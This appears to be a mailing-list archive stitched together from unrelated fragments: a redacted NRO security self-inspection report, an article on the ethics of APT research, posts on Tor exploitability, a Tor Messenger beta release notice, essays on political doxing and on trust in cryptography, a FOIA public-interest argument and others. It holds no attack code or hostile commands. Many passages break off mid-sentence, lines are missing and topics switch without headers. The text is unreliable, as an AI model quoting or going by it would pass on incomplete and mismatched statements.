maintains awareness of security policy
and procedures. Regular and aperiodic exercises, inspections, and
audits provide crucial inputs that are
indispensable to ensuring that the physical security program is
current and effective. Key challenges are
maintaining adequate funding to replace aging, malfunctioning, and
obsolete security equipment and training and
education for new personnel. The NRO has an organization-level process
for the Assessment and Authorization
55. Security Violations:
The NSM detail the NRO process for reporting and investigating
security incidents, infractions and violations.
Appropriate and prompt corrective actions were taken to mitigate the
severity of the infraction/violation, and to
sanction the offender via management, counterintelligence, and
personnel security processes. Infractions and
violations are centrally tracked in the Security Log (the NRO
incident/violation database). This database is
managed by the Program Security Officers in each directorate and
office, and enables the PSO to automatically
56. Security Education and Training:
OS&CI works closely with PSOs, Counterintelligence personnel, and the
Integrated Self Assessment Program
to determine any trends or specific areas that need an additional
educational awareness campaign. Security
communications are then targeted, utilizing large scale efforts, per a
topic area and audience for best impact
results. The NRO is adding additional classification management
questions to the Annual Security Refresher to
better satisfy the derivative classification training requirement.
OCAs complete yearly training provided by
57. Management and Oversight:
The NRO has a very mature Security management and oversight program.
Over the past FY, much greater
emphasis has been placed on ensuring all sites and facilities
accomplished the self-assessments and submited the
findings to the Government within the mandated time requirements. This
improved management oversight has
made an impact. Our self-inspection program coupled with security
officer visits, and formal team assessments
provide managers a report card on the health of our security programs.

actions, and to deter their reoccurrence.
OS&CI Policy Branch will issue written instructions that all
Classification Guides and original classification
decisions will use an OCA style classification block.
We plan to issue NRO-wide, monthly, short written educational
reminders of the most error-prone mistakes
reported in item 88 which will also include the proper way to classify
and mark materials.
PART I: Best Practices
Best practices are those actions or activities that
make your self-inspection program and/or CNSI program more effective
or efficient. They set your
program apart through innovation or by exceeding the minimum program
requirements. These are practices that may be utilized or emulated by
other agencies.
90. Describe best practices that were identified during the self-inspection.
One contractor site developed a database that allows self-assessments
to be completed by each program area at
that site. The database can apply filtering and reporting
capabilities, thereby allowing managers to focus
resources on a wide-range of security-related disciplines. This type
of approach and comprehensive tool
development had not been previously seen by the ISAP Program.
PART J: Explanatory Comments
Use this space to elaborate on any section of this form. If more space
is needed, provide as an attachment to this fonn. Provide explanations
for any
significant changes in trends/numbers from the previous year's report.
Item 16. All security directives and instructions are issued by the
DOS&CI and are reviewed and updated
annually but not as part of the self-inspection. All directives and
instructions are maintained on-line and are
accessible to all government employees and contractors.
(b)(3) 10 USC 424
Item 27. All government and contractor PSOs and CMOs (about ' '
'ndividuals) are authorized to correct
incorrect classification, incorrect use of SCI control channels, anâ€¢
incorrect dissemination restrictions.
Item 68. CIA personnel (including CIA contractors with Agency Data
Network or staff-like access) at the NRO
are required to take the CIA "2013 Derivative Classifier Training" by
their parent agency. All other government
and contractors at the NRO take their training through the Annual
Security Refresher briefing.
Item 78. The NRO is comprised of government individuals from various
agencies. Parent agencies set the rules
for their performance contract or rating system which cannot be
altered by the NRO. The percentage given
represents the percentage of individuals from agencies that require a
security performance evaluation statement.

@_subject: why we need more cryptome mirrors, in all corners 
it is exceptionally difficult, short of ordering physical duplicates,
to obtain a significant portion of cryptome archive from cryptome.org.
part of this is inherent abuse - any mirror gets serious algorithmic
beatings - akin to HackingTeam mirrors perhaps, not counting the
mindless cloud VM bot walkers, annoying enough.  even the hidden
service only mirrors got offensive proddings. remember, some of
cryptome-opponents are relying on obscurity - thwarted every time some
makes a mirror...
for this, i am quite grateful to see the archive.org natsec section
expanded with cryptome mirror!

By Eduard Kovacs on October 07, 2015
Analyzing advanced persistent threats (APTs) is not just about
collecting pieces of information, and companies that focus on APTs
should accept the fact that they have become intelligence brokers.
In a presentation last week at the Virus Bulletin conference in
Prague, Juan Andres Guerrero-Saade, senior security researcher in
Kaspersky Lab’s Global Research and Analysis Team, detailed the ethics
and perils associated with APT research.
Cyberattacks sponsored by nation states are increasingly investigated
by both startups and well-established security companies. However, it
appears that many firms involved in researching APTs lack long-term
strategy and they’ve failed to consider the repercussions of their
According to Guerrero-Saade, one of the main issues is that companies
and researchers have failed to understand that cyberespionage is a
part of classic espionage, and those analyzing such cyber operations
have failed to accept their role as intelligence brokers.
Intelligence agencies and private security firms involved in the
analysis of cyber espionage campaigns follow similar procedural
methodologies, but there are some noteworthy differences.
In the case of intelligence agencies, they receive a request, they
gather information, analyze it, and deliver it. But before delivering
it, the resulting report is taken through a strategic filtering
process that ensures the well-being of all involved parties.
On the other hand, threat intelligence teams don’t necessarily need a
delimiting request in order to begin analyzing a threat actor’s
activities -- an investigation can start from a decontextualized
sample or a vague request for incident response. Researchers collect
malware samples, indicators of compromise, and data on command and
control (C&C) infrastructure, but their analysis is oversimplified,
their strategy for release of the information is often deferred to PR
or sales departments. The resulting reports, which might not contain
any actionable intelligence, are often released to the public in an
effort to attract new customers and boost the company’s reputation,
but without taking into account the potential consequences,
Guerrero-Saade said.
While intelligence agencies and security researchers follow similar
procedural methodologies, there are major differences in the ethics
and especially the perils they face. The Kaspersky Lab expert has
pointed out that the activities of intelligence agencies are not
considered suspicious by other governmental institutions, the
employees of intelligence agencies enjoy legal protections, and their
work is shielded from political blowback.
In the case of threat intelligence teams, however, researchers don’t
benefit from any cover for their actions, they don’t enjoy any legal
protections, and the companies they work for can also suffer due to
their actions.
According to Guerrero-Saade, the list of perils faced by researchers
includes subtle pressure, patriotic enlistment, bribery, compromise
and blackmail, legal repercussions, threat to livelihood, threat to
viability of life in the actor’s area of influence, threat of force,
and even elimination. A perfect example of the perils faced by
researchers was provided in a separate talk at Virus Bulletin by
Costin Raiu, director of Kaspersky Lab’s Global Research and Analysis
Team. Raiu revealed that when he was involved in the analysis of
Stuxnet a few years ago, someone broke into his house and left a
rubber cube with the message “take a break” written on it.
In the case of companies, they can face political, financial and
regulatory repercussions, they can end up losing government contracts
and partnerships, and they can become the target of rumors and smear
campaigns if they don’t properly evaluate what they disclose and whom
they disclose to.
As for ethical concerns, the lack of malware diversification -- the
fact that the same malware is used against both extremists and less
“malicious” targets such as research institutions -- can cause
researchers to question whether or not they should detect the malware.
More precisely, if the malware is used against a legitimate
organization, then it should be detected to protect such entities. On
the other hand, if the malware is detected, it will also make it
easier for extremists to protect themselves against cyber spying
Another ethical issue is related to the fact that the researcher’s
insight into the operation they are targeting is always superficial.
At first glance, it might appear that the targeted entity is
“innocent,” such as an academic or a journalist, but in reality they
could be a radical academic or a terrorism-facilitating journalist.
Guerrero-Saade told SecurityWeek in an interview that threat actors
can plant false evidence to throw investigators off track -- these are
known as “black flag” operations. One good example is the group known
as “Wild Neutron” or “Morpho,” whose malware contains strings in both
Russian and Romanian.
Guerrero-Saade believes that the best way for threat intelligence
teams to overcome the challenges is to accept their role as
intelligence brokers and put more emphasis on strategy. The expert
believes companies should hire a chief strategic officer or someone
who is in charge of making decisions related to who gets what
information, instead of leaving the task to PR and marketing
Companies should also focus on providing actionable intelligence. One
negative example named by the researcher during his presentation at
Virus Bulletin is a recent report from ThreatConnect and Defense Group
that focuses on linking the APT group known as “Naikon” to a unit of
the Chinese People’s Liberation Army. The problem, according to
Guerrero-Saade, is that the connection made by researchers in the
report focuses on the analysis of an alleged PLA officer’s personal
postings on social media and provides little actionable intelligence.
The Kaspersky researcher told SecurityWeek that this is equivalent to
“doxing” someone you don’t like, just like members of the Anonymous
hacktivist movement do when they get uncomfortable with another
“The current threat intelligence market is in the midst of an identity
crisis. As companies transition from plain IT security to intelligence
production, the relevant methodology of intelligence brokerage must be
embraced in order to stand a chance against the supernatural market
tensions that are the product of meddling with the operations of
diverse intelligence agencies and enraging their respective
governments,” Guerrero-Saade said in a paper accompanying his
presentation at Virus Bulletin.
“The transition to intelligence brokerage proper is encouraged as a
means of survival for threat intelligence producers facing escalating
geopolitical tensions. By empowering the producers to strategically
control their offerings, these tensions are relieved or entirely
sidestepped and the market can flourish away from the limelight,” the
expert added.

unexpected transition into intelligence brokerage," is available for

An SDR can, in theory, capture more information that is just available
to the phone and can do so passively. Many of the same metrics apply
but can be derived from other traffic, e.g., for C1 the presence of
any unencrypted traffic on any channel in countries where traffic is
normally encrypted is a big giveaway.  Passively monitoring traffic
gives a more complete picture. It is, however, a game that a much
smaller number of participants can play because the hardware
requirements are for a suitable SDR rather than just a
Qualcomm-equiped Android phone.

relays are the most hardened configuration of Tor. if Tor Browser
attack surface is one end of spectrum of vuln, Tor the implementation
on a dedicated server is quite the opposite.

if only one target uses an insecure configuration, it is still
potentially useful, especially given the ease of proxy bypass
and for watering hole attacks, anything larger than zero hits is a win :)
clearly relevant.
not obfuscation; recognition of the defender's disadvantage.
as attacker (NSA) any vulnerability is relevant and potentially actionable.
it does; competence is not universally high and evenly distributed in
intelligence organizations.
the most technically accurate and detailed and informed information is
also the most sensitive, sadly. thus until ECI compartments get
spilled moving beyond the executive summary level presentations
there are techniques for finding bugs in rich attack surface like the
whole of Tor Browser, Tor, Tor Launcher, OS integration of same which
can grant exploit developers a reasonable confidence of finding
exploitable holes.
in a minimal, hardened Tor relay configuration these same techniques
may never find an exploitable vulnerability. it is another order of
magnitude harder, and exploits here require leveling with novel
attacks or techniques, typically.
exploiting foreign servers? sure; but highly sensitive. e.g. TAO CNE.
legal hacks of domestic servers - FISA court would have to approve?
both of these are legitimate restraints, though we may argue about
their effectiveness.
over to Juan for retort,
 preferably with more substance to justify opinions this time :)

References: <20151029211200.GA2253
---------- Forwarded message ----------
Today we are releasing a new, beta version of Tor Messenger, based on
Instantbird [0], an instant messaging client developed in the Mozilla
* What is it?
Tor Messenger is a cross-platform chat program that aims to be secure by
default and sends all of its traffic over Tor.  It supports a wide variety of
transport networks, including Jabber (XMPP), IRC, Google Talk, Facebook Chat,
Twitter, Yahoo, and others; enables Off-the-Record (OTR) Messaging [1]
automatically; and has an easy-to-use graphical user interface localized into
multiple languages.
* What it isn't...
Tor Messenger builds on the networks you are familiar with, so that you can
continue communicating in a way your contacts are willing and able to do. This
has traditionally been in a client-server model, meaning that your metadata
(specifically the relationships between contacts) can be logged by the server.
However, your route to the server will be hidden because you are communicating
over Tor.
We are also excited about systems like Pond [2] and Ricochet [3], which try to
solve this problem, and would encourage you to look at their designs and use
them too.
* Why Instantbird?
We considered a number of messaging clients: Pidgin, Adam Langley's
xmpp-client, and Instantbird. Instantbird was the pragmatic choice -- its
transport protocols are written in a memory-safe language (JavaScript); it has
a graphical user interface and already supports many natural languages; and
it's a XUL application, which means we can leverage both the code (Tor
Launcher) and in-house expertise that the Tor Project has developed working on
Tor Browser with Firefox. It also has an active and vibrant software developer
community that has been very responsive and understanding of our needs. The
main feature it lacked was OTR support, which we have implemented [4] and hope
to upstream to the main Instantbird repository for the benefit of all
Instantbird (and Thunderbird) users.
* Current Status
Today we are releasing a beta version with which we hope to gain both
usability and security related feedback. There have been three previous alpha
releases to the mailing lists that have already helped smooth out some of the
rougher edges.
* Downloads
Linux (32-bit)
    Linux (64-bit)
        OS X
            The sha256sums.txt file containing hashes of the bundles is signed with the
key 0x6887935AB297B391 (fingerprint: 3A0B 3D84 3708 9613 6B84  5E82 6887 935A
B297 B391).
* Instructions
- On Linux, extract the bundle(s) and then run: ./start-tor-messenger.desktop
- On OS X, copy the Tor Messenger application from the disk image to your
  local disk before running it.
On all platforms, Tor Messenger sets the profile folder for
Firefox/Instantbird to the installation directory.
- Note that as a policy, unencrypted one-to-one conversations are not allowed
  and your messages will not be transmitted if the person you are talking with
  does not have an OTR-enabled client. You can disable this option in the
  preferences to allow unencrypted communication but doing so is not
  recommended.
* Source Code
We are doing automated builds [5] of Tor Messenger for all platforms.
The Linux builds are reproducible: anyone who builds Tor Messenger for Linux
should have byte-for-byte identical binaries compared with other builds from a
given source. You can build it yourself [6] and let us know if you encounter
any problems or cannot match our build. The Windows and OS X builds are not
completely reproducible yet but we are working on it [7].
* What's to Come
Our current focus is security, robustness and user experience. We will be
fixing bugs and releasing updates as appropriate, and in the future, we plan
on pairing releases with Mozilla's Extended Support Release (ESR) cycle. We
have some ideas on where to take Tor Messenger but we would like to hear what
you have to say. Some possibilities include:
- Reproducible builds for Windows and OS X (
- Sandboxing (
- Automatic updates (
- Improved Tor support (
- OTR over Twitter DMs (
- Produce (and distribute) internationalized builds (
- Secure multi-party communication (np1sec) [8]
- Encrypted file-transfers
- Usability study
* How To Help
Give it a try and provide feedback, requests, and file bugs [9] (choose the
"Tor Messenger" component). If you are a developer, help us close all our
tickets [10] or help us review our design doc [11]. As always, we are idling
on IRC in  (OFTC) (nicks: arlolra; boklm; sukhe) and subscribed to the
tor-talk/dev mailing lists.
Please note that this release is for users who would like to help us with
testing the product but at the same time who also understand the risks
involved in using beta software.
Thanks and we hope you enjoy Tor Messenger!

Last week, CIA director John O. Brennan became the latest victim of
what's become a popular way to embarrass and harass people on the
internet. A hacker allegedly broke into his AOL account and published
emails and documents found inside, many of them personal and
It's called doxing—sometimes doxxing—from the word "documents." It
emerged in the 1990s as a hacker revenge tactic, and has since been as
a tool to harass and intimidate people on the internet. Someone would
threaten a woman with physical harm, or try to incite others to harm
her, and publish her personal information as a way of saying "I know a
lot about you—like where you live and work." Victims of doxing talk
about the fear that this tactic instills. It's very effective, by
which I mean that it's horrible.
Brennan's doxing was slightly different. Here, the attacker had a more
political motive. He wasn't out to intimidate Brennan; he simply
wanted to embarrass him. His personal papers were dumped
indiscriminately, fodder for an eager press. This doxing was a
political act, and we're seeing this kind of thing more and more.
    Lots of people will have to face the publication of personal
correspondence, documents, and information they would rather be
Last year, the government of North Korea allegedly did this to Sony.
Hackers the FBI believes were working for North Korea broke into the
company's networks, stole a huge amount of corporate data, and
published it. This included unreleased movies, financial information,
company plans, and personal emails. The reputational damage to the
company was enormous; the company estimated the cost at $41 million.
In July, hackers stole and published sensitive documents from the
cyberweapons arms manufacturer Hacking Team. That same month,
different hackers did the same thing to the infidelity website Ashley
Madison. In 2014, hackers broke into the iCloud accounts of over 100
celebrities and published personal photographs, most containing some
nudity. In 2013, Edward Snowden doxed the NSA.
These aren't the first instances of politically motivated doxing, but
there's a clear trend. As people realize what an effective attack this
can be, and how an individual can use the tactic to do considerable
damage to powerful people and institutions, we're going to see a lot
more of it.
On the internet, attack is easier than defense. We're living in a
world where a sufficiently skilled and motivated attacker will
circumvent network security. Even worse, most internet security
assumes it needs to defend against an opportunistic attacker who will
attack the weakest network in order to get—for example—a pile of
credit card numbers. The notion of a targeted attacker, who wants Sony
or Ashley Madison or John Brennan because of what they stand for, is
still new. And it's even harder to defend against.
What this means is that we're going to see more political doxing in
the future, against both people and institutions. It's going to be a
factor in elections. It's going to be a factor in anti-corporate
activism. More people will find their personal information exposed to
the world: politicians, corporate executives, celebrities, divisive
and outspoken individuals.
Of course they won't all be doxed, but some of them will. Some of them
will be doxed directly, like Brennan. Some of them will be inadvertent
victims of a doxing attack aimed at a company where their information
is stored, like those celebrities with iPhone accounts and every
customer of Ashley Madison. Regardless of the method, lots of people
will have to face the publication of personal correspondence,
documents, and information they would rather be private.
In the end, doxing is a tactic that the powerless can effectively use
against the powerful. It can be used for whistleblowing. It can be
used as a vehicle for social change. And it can be used to embarrass,
harass, and intimidate. Its popularity will rise and fall on this
effectiveness, especially in a world where prosecuting the doxers is
so difficult.
There's no good solution for this right now. We all have the right to
privacy, and we should be free from doxing. But we're not, and those
of us who are in the public eye have no choice but to rethink our
online data shadows.

fair enough. my assertion relies on the fact that conflict is
destructive in some manner, and cooperation is productive in some
sometimes, you must defeat bad ideas for the good to thrive:
 this is the essence of our age: competition for survival of the fittest.
yet there is a limit to what competition can achieve.
consider that competition can never reach a solution at which full
cooperation will arrive. thus, if competition defines our current age,
which leads to resource exhaustion,
cooperation leads to abundance for all, given sufficient technology,
and a better age above our cruel origins.
this is the great divide:
do we carry on with cruelty?
or do we strive for cooperation?
it is an ideal: a state of society in educated awareness and cohesion,
without centralized authority, working toward a collective best end.
it is globally optimal because there is only cooperation. no
destruction competition.
by definition, the efforts of the losers are "waste".
bingo. the crux!
a globally cooperative society would chose this, because it is best
for all, which is best for you. (and not in a "I'm going to kill you,
to save humanity" triviality sense.)
we're getting at the meat of the argument, which is a system and
technology and society which leverages technology in a productive
manner - rational anarchy - instead of a destructive manner - AP
selective killing.
i am aiming for something better.
i don't expect to convince anyone until the argument is formed. i also
reserve the right to proclaim that better options exist.
this is my beef with AP: that we may see it a solution, in near term,
missing a greener pasture at the distance...

capacity, you may become unobservable (via loss) resulting in failure

---------- Forwarded message ----------
Actually, this is not the first laptop based on open firmware and
software. Glugglug/Minifree did that quite a bit of time ago with
their Libreboot, even FSF certified. Nobody cares, sadly.
Librem likely will fail too for the same reasons - ideology is not
enough, and they are even worse at it technically-wise.
On the other hand, having a more secure laptop is a tangible benefit.
Without backdoors, with fewer bugs, audited firmware, perhaps even
partially audited hardware.
Maybe even make it easier on the designers, produce a server platform
matching those requirements - there's more of a market.
Google might even get in, as they are known to use a lot of customized
firmware and even hardware. I think they used to support Coreboot
They might have stopped caring about this though.
Having competitive hardware or design is not the same as being a competitor.
Try this argument again when it's actually a competitor to, say, any
iPhone. At least in top 10.
By the way, Fairphone 2 is a nice story for uninformed people, about
on par with Librem.
I approve of their other efforts, but it's nowhere near enough or
close to what's necessary.
The critical component, Qualcomm 801 chipset, will be running a
proprietary microkernel with proprietary RF firmware, proprietary DSP
code and more.
Good luck getting Qualcomm to open that - they are quite hostile to
any of those efforts.
Again, poor choice of an architecture and a very tough nut to crack.
(For instance, Marvell is way more open and much less hostile.)
I wouldn't quite count on it, though they seem to be expanding their
open source drivers effort which bodes somewhat well.
That said, their GPUs still require a few fat, complex firmware blobs
- fortunately Qubes is pretty good at scraping GUI and enforcing
separation thereof.
P.S. If we're talking about pie in the sky designs:
Probably the best design for an OS like Qubes would be to have
separate small CPUs instead of many cores, with separate RAM and
memory controller. Maybe even an integrated GPU each to run OpenGL.
Multiple USB controllers and hubs to simplify hardware redirection.
Multiple small flash drives or even chips. Expensive, power intensive,
hard to cool and large though.
Think a tiny cluster of mostly separate PCs, connected via an
extremely fast bus, such as HyperTransport. NUMA considerations would
be less important here as the CPUs with their associated memory would
be dedicated to a VM and the support exists in both Xen and Linux

- Re-uses onions, rather than trying to build its own anonymity
overlay for friend finding.
- Uses cryptobox for crypto stuffs, rather than rolling own.
- Supports clients of various types, per preference, rather than
monolithic structure.
the bad:
- written in C and passing things around potentially unsafely. see the
address parsing in network.c, the DHT code. needs a good audit.
- poor network performance primitives with UDP - ok, not a problem

  this is my first attempt to argue compelling public interest against a
privacy exemption,
 it is as follows;
Please recognize the public interest in this request for responsive
records as follows:
First and foremost, extensive media attention during this period was
generated due to the intersection of "hacking" and "reverse
engineering" combined with the DMCA provisions deeming some
technologies illegal at interest to the information technology
industry as a whole. This reason alone is sufficient and compelling
justification for transparency in a watershed case, however, I shall
Second, this case involved not a US citizen, but a foreign national.
As has recently been scoured in the technical press, Wassenar with its
incumbent BIS obligations has brought discussion of the risks
foreigners face visiting the EU and US, in addition to US citizens
abroad who now find themselves subject to severe technical controls
due to their industry participation. I feel that surely this must
provide beyond sufficient justification for public interest in
documents responsive to this request, yet I shall continue to exhaust
the relevant perspectives in my quiver of inquiry.
Thus thirdly, the conference venue, DEF CON security conference,
itself of notoriety and high esteem in the technical community, was
the operating domain for the closing moves of this investigation. The
logistics and technical considerations for operating in this domain
thus also compounds the public interest in the activity for which the
records responsive to this request have been requested.
Fourthly, and there is a fourthly for sure, the activities undertaken
by the agency were at risk of alienating a talent pool the Bureau has
increasingly courted and pursued for their invaluable skills in
digital forensic analysis, reverse engineering, and information
security. Balancing actions before a critical group who also interacts
frequently with the agency, and from whom the Bureau itself draws
professional talent, amplifies the interest and relevance of this
inquiry, and the need for unrestrained transparency when identifying
documents responsive to this request.
Lastly and finally, yet not to diminish the inherent privacy rights
afforded to all earth humans, inalienable, with justice for all, the
privacy rights which this agency has cited in justification for
limiting the documents responsive to this request, please note that
the privacy exemptions provided by law are specific and limited to
situations where there is a compelling personal privacy interest. The
agency has not provided any compelling privacy interest on behalf of
the fine Mr. Sklyarov, and his foreign status removes the common
privacy concerns of an individual within a domestic community at issue
in responsive documents. It is fully reasonable, per Department of
Justice v. Reporters Committee for Freedom of the Press, that the FBI
may provide documents detailing "what they were up to" in this
investigation, without undue burden on the privacy rights of a foreign
citizen briefly visiting to attend a public conference in the United
Please do recognize and acquiescence to the public interest so broadly in view.

The Social Construction of Trust in Cryptographic Systems
3 February 2016
(This is an extract from my contribution to Harper, Richard.
“Introduction and Overview”, Trust, Computing, and Society. Ed.
Richard H. R. Harper. 1st ed. New York: Cambridge University Press,
2014. pp. 3-14. Cambridge Books Online. Web. 03 February 2016.
Cryptography has been used for centuries to secure military,
diplomatic, and commercial communications that may fall into the hands
of enemies and competitors (Kahn 1996). Traditional cryptography
concerns itself with a simple problem: Alice wants to send a message
to Bob over some communication channel that may be observed by Eve,
but without Eve being able to read the content of the message. To do
this, Alice and Bob share a short key, say a passphrase or a poem.
Alice then uses this key to scramble (or encrypt) the message, using a
cipher, and sends the message to Bob. Bob is able to use the shared
key to invert the scrambling (or “decrypt”) and recover the message.
The hope is that Eve, without the knowledge of the key, will not be
able to unscramble the message, thus preserving its confidentiality.
It is important to note that in this traditional setting we have not
removed the need for a secure channel. The shared key needs to be
exchanged securely, because its compromise would allow Eve to read
messages. Yet, the hope is that the key is much shorter than the
messages subsequently exchanged, and thus easier to transport securely
once (by memorizing it or by better physical security). What about the
cipher? Should the method by which the key and the message are
combined not be kept secret? In “La Cryptographie Militaire” in 1883,
Auguste Kerckhoffs stated a number of principles, including that only
the key should be considered secret, not the cipher method itself
(Kerckhoffs 1883). Both the reliance on a small key and the fact that
other aspects of the system are public is an application of the
minimization principle we have already seen in secure system
engineering. It is by minimizing what has to be trusted for the
security policy to hold that one can build and verify secure systems –
in the context of traditional cryptography, in principle, this is just
a short key.
Kerckhoffs argues that only the key, not the secrecy of the cipher is
in the trusted computing base. But a key property of the cipher is
relied on: Eve must not be able to use an encrypted message and
knowledge of the cipher to recover the message without access to the
secret key. This is very different from previous security assumptions
or components of the TCB. It is not about the physical restrictions on
Eve, and it is not about the logical operations of the computer
software and hardware that could be verified by careful inspection. It
comes down to an assumption that Eve cannot solve a somehow difficult
mathematical problem. Thus, how can you trust a cipher? How can you
trust that the adversary cannot solve a mathematical problem?
To speak the truth, this was not a major concern until relatively
recently, compared with the long history of cryptography. Before
computers, encoding and decoding had to be performed by hand or using
electromechanical machines. Concerns such as usability, speed, cost of
the equipment, and lack of decoding errors were the main concerns in
choosing a cipher. When it comes to security, it was assumed that if a
“clever person” proposes a cipher, then it would take someone much
cleverer than them to decode it. It was even sometimes assumed that
ciphers were of such complexity that there was “no way” to decode
messages without the key. The assumption that other nations may not
have a supply of “clever” people may have to do with a colonial
ideology of nineteenth and early twentieth centuries. Events leading
to the 1950s clearly contradict this: ciphers used by major military
powers were often broken by their opponents.
In 1949, Claude Shannon set out to define what a perfect cipher would
be. He wanted it to be “impossible” to solve the mathematical problem
underlying the cipher (Shannon 1949). The results of this seminal work
are mixed. On the positive side, there is a perfect cipher that, no
matter how clever an adversary is, cannot be solved – the one-time
pad. On the down side, the key of the cipher is as long as the
message, must be absolutely random, and can only be used once.
Therefore the advantage of short keys, in terms of minimizing their
exposure, is lost and the cost of generating keys is high (avoiding
bias in generating random keys is harder than expected). Furthermore,
Shannon proves that any cipher with smaller keys cannot be perfectly
secure. Because the one-time pad is not practical in many cases, how
can one trust a cipher with short keys, knowing that its security
depends on the complexity of finding a solution? For about thirty
years, the United States and the UK followed a very pragmatic approach
to this: they kept the cryptological advances of World War II under
wraps; they limited the export of cryptographic equipment and know-how
through export regulations; and their signal intelligence agencies –
the NSA and GCHQ, respectively – became the largest worldwide
employers of mathematicians and the largest customers of
supercomputers. Additionally, in their roles in eavesdropping on their
enemies’ communications, they evaluated the security of the systems
used to protect government communications. The assurance in
cryptography came at the cost of being the largest organizations that
know about cryptography in the world.
The problem with this arrangement is that it relies on a monopoly of
knowledge around cryptology. Yet, as we have seen with the advent of
commercial telecommunications, cryptography becomes important for
nongovernment uses. Even the simplest secure remote authentication
mechanism requires some cryptography if it is to be used over insecure
channels. Therefore, keeping cryptography under wraps is not an
option: in 1977, the NSA approved the IBM design for a public cipher,
the Data Encryption Standard (DES), for public use. It was
standardized in 1979 by the US National Institute for Standards and
Technology (NIST).
The publication of DES launched a wide interest in cryptography in the
public academic community. Many people wanted to understand how it
works and why it is secure. Yet, the fact that the NSA tweaked its
design, for undisclosed reasons, created widespread suspicion in the
cipher. The fear was that a subtle flaw was introduced to make
decryption easy for intelligence agencies. It is fair to say that many
academic cryptographers did not trust DES!
Another important innovation in 1976 was presented by Whitfield Diffie
and Martin Hellman in their work “New Directions in Cryptography”
(Diffie & Hellman 1976). They show that it is possible to preserve the
confidentiality of a conversation over a public channel, without
sharing a secret key! This is today known as “Public Key
Cryptography,” because it relies on Alice knowing a public key for
Bob, shared with anyone in the world, and using it to encrypt a
message. Bob has the corresponding private part of the key, and is the
only one that can decode messages used with the public key. In 1977,
Ron Rivest, Adi Shamir, and Leonard Adleman proposed a further system,
the RSA, that also allowed for the equivalent of “digital signatures”
(Rivest et al. 1978).
What is different in terms of trusting public key cryptography versus
traditional ciphers? Both the Diffie-Hellman system and the RSA system
base their security on number theoretic problems. For example, RSA
relies on the difficulty of factoring integers with two very large
factors (hundreds of digits). Unlike traditional ciphers – such as DES
– that rely on many layers of complex problems, public key algorithms
base their security on a handful of elegant number theoretic problems.
Number theory, a discipline that G.H. Hardy argued at the beginning of
the twentieth century was very pure in terms of its lack of any
practical application (Hardy & Snow 1967), quickly became the deciding
factor on whether one can trust the most significant innovation in the
history of cryptology! As a result, a lot of interest and funding
directed academic mathematicians to study whether the mathematical
problems underpinning public key cryptography were in fact difficult
and how difficult the problems were.
Interestingly, public key cryptography does not eliminate the need to
totally trust the keys. Unlike traditional cryptography, there is no
need for Bob to share a secret key with Alice to receive confidential
communications. Instead, Bob needs to keep the private key secret and
not share it with anyone else. Maintaining the confidentiality of
private keys is simpler than sharing secret keys safely, but it is far
from trivial given their long-term nature. What needs to be shared is
Bob’s public key. Furthermore, Alice need to be sure she is using the
public key associated with the Bob’s private key; if Eve convinces
Alice to use an arbitrary public key to encrypt a message to Bob, then
Eve could decrypt all messages.
The need to securely associate public keys with entities has been
recognized early on. Diffie and Hellman proposed to publish a book, a
bit like the phone register, associating public keys with people. In
practice, a public key infrastructure is used to do this: trusted
authorities, like Verisign, issue digital certificates to attest that
a particular key corresponds to a particular Internet address. These
authorities are in charge of ensuring that the identity, the keys, and
their association are correct. The digital certificates are “signed”
using the signature key of the authorities that anyone can verify.
The use of certificate authorities is not a natural architecture in
many cases. If Alice and Bob know each other, they can presumably use
another way to ensure Alice knows the correct public key for Bob.
Similarly, if a software vendor wants to sign updates for their own
software, they can presumably embed the correct public key into it,
instead of relying on public key authorities to link their own key
with their own identity.
The use of public key infrastructures (PKI) is necessary in case Alice
wants to communicate with Bob without them having any previous
relationship. In that case Alice, given only a valid name for Bob, can
establish a private channel to Bob (as long as it trusts the PKI).
This is often confused: the PKI ensures that Alice talks to Bob, but
not that Bob is “trustworthy” in any other way. For example, a Web
browser can establish a secure channel to a Web service that is
compromised or simply belong to the mafia. The secrecy provided by the
channel does not, in that case, provide any guarantees as to the
operation of the Web service. Recently, PKI services and browsers have
tried to augment their services by only issuing certificates to
entities that are verified as somehow legitimate.
Deferring the link between identities and public keys to trusted third
parties places this third party in a system’s TCB. Can certification
authorities be trusted to support your security policy? In some ways,
no. As implemented in current browsers, any certification authority
(CA) can sign a digital certificate for any site on the Internet
(Ellison & Schneier 2000). This means that a rogue national CA (say,
from Turkey) can sign certificates for the U.S. State Department, that
browsers will believe. In 2011, the Dutch certificate authority
Diginotar was hacked, and their secret signature key was stolen
(Fox-IT 2012). As a result, fake certificates were issued for a number
of sensitive sites. Do CAs have incentives to protect their key? Do
they have enough incentives to check the identity of the people or
entities behind the certificates they sign?
Cryptographic primitives like ciphers and digital signatures have been
combined in a variety of protocols. One of the most famous is the
Secure Socket Layer SSL or TLS, which provides encryption to access
encrypted Web sites on the Internet (all sites following the https://
protocol). Interestingly, once secure primitives are combined into
larger protocols, their composition is not guaranteed to be secure.
For example a number of problems have been identified against SSL and
TLS that are not related to the weaknesses of the basic ciphers used
(Vaudenay 2002).
The observation that cryptographic schemes are brittle and could be
insecure even if they rely on secure primitives (as did many deployed
protocols) led to a crisis within cryptologic research circles. The
school of “provable security” proposes that rigorous proofs of
security should accompany any cryptographic protocol to ensure it is
secure. In fact “provable security” is a bit of a misnomer: the basic
building blocks of cryptography, namely public key schemes and ciphers
cannot be proved secure, as Shannon argued. So a security proof is
merely a reduction proof: it shows that any weakness in the complex
cryptographic scheme can be reduced to a weakness in one of the
primitives, or a well-recognized cryptographic hardness assumption. It
effectively proves that a complex cryptographic scheme reduces to the
security of a small set of cryptographic components, not unlike
arguments about a small Trusted Computing Base. Yet, even those proofs
of security often work at a certain level of abstraction and often do
not include all details of the protocol. Furthermore, not all
properties can be described in the logic used to perform the proofs.
As a result, even provably secure protocols have been found to have
weaknesses (Pfitzmann & Waidner 1992).
So, the question of “How much can you trust cryptography?” has in part
itself been reduced to “How much can you trust the correctness of a
mathematical proof on a model of the world?” and “How much can one
trust that a correct proof in a model applies to the real world?”
These are deep epistemological questions, and it is somehow ironic
that national, corporate, and personal security depends on them. In
addition to these, one may have to trust certificate authorities and
assumptions on the hardness of deep mathematical problems. Therefore,
it is fair to say that trust in cryptographic mechanisms is an
extremely complex social process.

The Barrett Brown Review of Arts and Letters and Prison
The Rule of Law Enforcement
Barrett Brown
Feb. 2 2016, 3:02 p.m.
AFTER HAVING SPENT the prior six months in a fruitless cycle of
retaliation and counter-retaliation and counter-counter-retaliation
with the administration of the Federal Correctional Institution at
Fort Worth, where I managed to do about half of my time in the hole
